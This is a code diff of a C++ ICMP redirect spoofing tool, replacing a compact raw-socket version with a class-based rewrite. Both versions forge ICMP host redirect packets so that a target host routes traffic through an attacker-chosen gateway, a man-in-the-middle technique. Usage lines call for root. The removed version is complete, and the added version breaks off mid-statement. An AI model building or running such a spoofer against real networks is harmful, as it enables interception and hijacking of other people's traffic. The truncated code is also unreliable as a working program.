@@ -1,47 +1,58 @@
-// ============================================================
-// icmp_redirect.cpp — send ICMP redirect to alter routing
-// ------------------------------------------------------------
-// Compile: clang++ -std=c++17 -O2 -o icmp_redirect icmp_redirect.cpp
-// Usage:   sudo ./icmp_redirect <src> <dst> <new_gw> <target>
-// ============================================================
+// Compile: g++ -o icmp_redirect icmp_redirect.cpp
+// Run: sudo ./icmp_redirect <target_ip> <gateway_ip> <new_gateway_ip>
+// Requires: root privileges
+
+#include <iostream>
+#include <cstring>
+#include <cstdlib>
 #include <sys/socket.h>
 #include <netinet/ip.h>
 #include <netinet/ip_icmp.h>
 #include <arpa/inet.h>
 #include <unistd.h>
-#include <cstdio>
-#include <cstdlib>
-#include <cstring>
 
-int main(int argc, char** argv) {
-    if (argc < 5) return 1;
-    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    int one = 1;
-    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
-
-    sockaddr_in dst{};
-    dst.sin_family = AF_INET;
-    inet_pton(AF_INET, argv[2], &dst.sin_addr);
-
-    char buf[4096] = {0};
-    auto* ip = (iphdr*)buf;
-    auto* icmp = (icmphdr*)(buf + sizeof(iphdr));
-
-    ip->version = 4; ip->ihl = 5; ip->tot_len = htons(56);
-    ip->ttl = 64; ip->protocol = IPPROTO_ICMP;
-    inet_pton(AF_INET, argv[1], &ip->saddr);
-    ip->daddr = dst.sin_addr.s_addr;
-
-    icmp->type = ICMP_REDIRECT;
-    icmp->code = ICMP_REDIRECT_HOST;
-    inet_pton(AF_INET, argv[3], &icmp->un.gateway);
-
-    // Embed original IP header + 8 bytes (target)
-    auto* orig = (iphdr*)(buf + sizeof(iphdr) + sizeof(icmphdr));
-    orig->version = 4; orig->ihl = 5; orig->protocol = IPPROTO_TCP;
-    inet_pton(AF_INET, argv[4], &orig->daddr);
-
-    sendto(s, buf, 56, 0, (sockaddr*)&dst, sizeof(dst));
-    std::printf("[+] ICMP redirect sent\n");
-    return 0;
-}
+class ICMPRedirect {
+private:
+    int sock;
+    
+    unsigned short checksum(void* data, int len) {
+        unsigned short* buf = (unsigned short*)data;
+        unsigned int sum = 0;
+        while (len > 1) { sum += *buf++; len -= 2; }
+        if (len == 1) sum += *(unsigned char*)buf;
+        sum = (sum >> 16) + (sum & 0xFFFF);
+        sum += (sum >> 16);
+        return ~sum;
+    }
+    
+public:
+    ICMPRedirect() {
+        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+        if (sock < 0) { perror("socket"); exit(1); }
+    }
+    
+    void sendRedirect(const char* targetIP, const char* gatewayIP, 
+                      const char* newGatewayIP) {
+        struct sockaddr_in target;
+        target.sin_family = AF_INET;
+        target.sin_addr.s_addr = inet_addr(targetIP);
+        
+        char packet[4096];
+        struct icmphdr* icmp = (struct icmphdr*)packet;
+        
+        memset(packet, 0, 4096);
+        
+        icmp->type = ICMP_REDIRECT;
+        icmp->code = ICMP_REDIRECT_HOST;
+        icmp->checksum = 0;
+        icmp->un.gateway = inet_addr(newGatewayIP);
+        
+        // Original IP header (that caused redirect)
+        struct iphdr* origIP = (struct iphdr*)(packet + sizeof(struct icmphdr));
+        origIP->ihl = 5;
+        origIP->version = 4;
+        origIP->tot_len = sizeof(struct iphdr) + 8;
+        origIP->ttl = 64;
+        origIP->protocol = IPPROTO_TCP;
+        origIP->saddr = inet_addr(gatewayIP);
+        origIP->
